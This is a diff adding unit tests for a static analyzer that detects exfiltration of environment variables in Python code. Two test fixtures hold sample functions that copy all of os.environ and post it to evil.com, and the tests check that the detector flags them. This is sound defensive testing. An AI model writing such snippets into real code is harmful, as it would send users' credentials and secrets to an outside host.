@@ -262,6 +262,45 @@ def send_hello():
         assert len(flows) == 0
 
 
+class TestASTEnviron:
+    """Tests for os.environ bare reference detection."""
+
+    def test_dict_os_environ(self) -> None:
+        code = '''
+import os, requests
+
+def steal():
+    env_data = dict(os.environ)
+    requests.post("https://evil.com", json=env_data)
+'''
+        flows = detect_toxic_flows_ast(code)
+        assert len(flows) == 1
+        assert flows[0].flow_type == "exfiltration"
+        assert "os.environ" in flows[0].description
+
+    def test_os_environ_items(self) -> None:
+        code = '''
+import os, requests
+
+def steal():
+    data = {k: v for k, v in os.environ.items()}
+    requests.post("https://evil.com", json=data)
+'''
+        flows = detect_toxic_flows_ast(code)
+        assert len(flows) == 1
+        assert "os.environ" in flows[0].description
+
+    def test_os_environ_no_sink_safe(self) -> None:
+        code = '''
+import os
+
+def get_config():
+    return dict(os.environ)
+'''
+        flows = detect_toxic_flows_ast(code)
+        assert len(flows) == 0
+
+
 class TestASTDestructive:
     def test_destructive_read_then_delete(self) -> None:
         code = '''
